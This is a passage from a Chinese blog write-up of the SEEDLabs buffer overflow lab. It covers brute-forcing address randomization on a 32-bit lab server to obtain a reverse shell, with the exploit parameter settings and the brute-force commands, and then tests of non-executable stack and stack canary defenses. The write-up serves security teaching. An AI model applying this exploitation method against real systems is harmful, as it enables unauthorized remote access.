+<p><img src="https://img-blog.csdnimg.cn/69233ab2815347d1adb48855923770a1.png" alt="请添加图片描述"></p>
+<h2 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h2><p><strong>实验目标：</strong> 对 32 位的目标服务器 10.9.0.5 的 bof 进行攻击，达到 reverse shell 的目的（已知 <code>%ebp</code> 和 buffer 地址，但需要解决地址随机化的问题）</p>
+<p><strong>实验方案：</strong> 32 位机器上只有 19 位能够用于地址随机化，相比 64 位机器来说少得多，因此可以采用 fengshui 的思想暴力破解</p>
+<p><strong>实验步骤：</strong></p>
+<p>① 首先要开启地址随机化：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo /sbin/sysctl -w kernel.randomize_va_space=2</span></span><br></pre></td></tr></table></figure>
+<p>② 观察开启地址随机化后的现象，<code>%ebp</code> 和 buffer 地址每次都会发生变化：</p>
+<p><img src="https://img-blog.csdnimg.cn/5fd8a51818164c9e8a3c4f7e8796fc77.png" alt="请添加图片描述"></p>
+<p>③ 采用 Task 2 的 <code>exlpoit.py</code>，修改相关参数为：</p>
+<ul>
+<li>start：沿用 Task5 的方法， <code>start = 517 - len(shellcode)</code> ，这样可以在 shellcode 前面保留尽可能多的 NOP</li>
+<li>ret：使用上面地址随机化时出现的 buffer 地址中的某一个加上 start，即 ret = buffer + start</li>
+</ul>
+<p>③ 生成 <code>badfile</code> ，运行 <code>brute-force.sh</code> ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./exploit.py</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./ brute-force.sh</span></span><br></pre></td></tr></table></figure>
+<p>④ 观察到 35 秒时程序阻塞：</p>
+<p><img src="https://img-blog.csdnimg.cn/7d15a4be67234c56b52f770984b76ccd.png" alt="请添加图片描述"></p>
+<p>而此时监听窗口也出现了 10.9.0.5 的 shell：</p>
+<p><img src="https://img-blog.csdnimg.cn/4a58edbc97bd44c39a118ccb25ccd0e5.png" alt="请添加图片描述"></p>
+<p>查看 10.9.0.5 的 docker ID ，确实是 7fceadc1e24b，说明攻击成功：</p>
+<p><img src="https://img-blog.csdnimg.cn/3bf5a8c61f49448d8dcb0020c30df645.png" alt="请添加图片描述"></p>
+<h2 id="Task-7"><a href="#Task-7" class="headerlink" title="Task 7"></a>Task 7</h2><p><strong>实验目标：</strong> 观察其他应对措施</p>
+<p><strong>实验步骤：</strong></p>
+<p>① 观察服务器程序的保护措施：</p>
+<p><img src="https://img-blog.csdnimg.cn/850799b1647a41e19e48cc19485ef20e.png" alt="请添加图片描述"></p>
+<p>其中，<code>-z execstack</code> 是控制栈上数据是否能被执行的开关；<code>-fno-stack-protector</code> 是 Canary 的保护方法</p>
+<p>② 去除 <code>shellcode</code> 目录下 <code>Makefile</code> 的 <code>-z exstack</code> 选项，运行均报 Segmentation fault：</p>
+<p><img src="https://img-blog.csdnimg.cn/2e8a533f022842e4991e3933d11e38b8.png" alt="请添加图片描述"></p>
+<p>③ 在 <code>server-code</code> 目录下，去除 <code>-fno-stack-protector</code> 选项，不去除去除 <code>-z execstack</code> 选项， 编译运行后进行攻击，出现 Segmentaion fault：</p>
+<p><img src="https://img-blog.csdnimg.cn/7459605b44cd427ea64d126cff917a73.jpeg" alt="请添加图片描述"></p>
+<p>④ 在 <code>server-code</code> 目录下，不去除 <code>-fno-stack-protector</code> 选项，去除 <code>-z execstack</code> 选项， 编译运行后进行攻击，发现栈被更改而终止：</p>
+<p><img src="https://img-blog.csdnimg.cn/c70968cf16a74e979f1d91ee1f9841cd.png" alt="请添加图片描述"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/Security/">#Security</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/SEEDLabs/">#SEEDLabs</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/10/16/Java%20String%E7%9A%84%E5%AD%98%E5%82%A8/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Java String的存储</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/09/14/C++%20SGI%20STL%20%E7%9A%84%20list.sort()%20%E5%88%86%E6%9E%90/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">C++ SGI STL 的 list::sort() 分析</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">airhaohan</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SEEDLabs-Buffer-Overflow"><span class="nav-text">SEEDLabs Buffer Overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="nav-text">实验原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task-1"><span class="nav-text">Task 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task-2"><span class="nav-text">Task 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task-3"><span class="nav-text">Task 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task-4"><span class="nav-text">Task 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task-5"><span class="nav-text">Task 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task-6"><span class="nav-text">Task 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Task-7"><span class="nav-text">Task 7</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
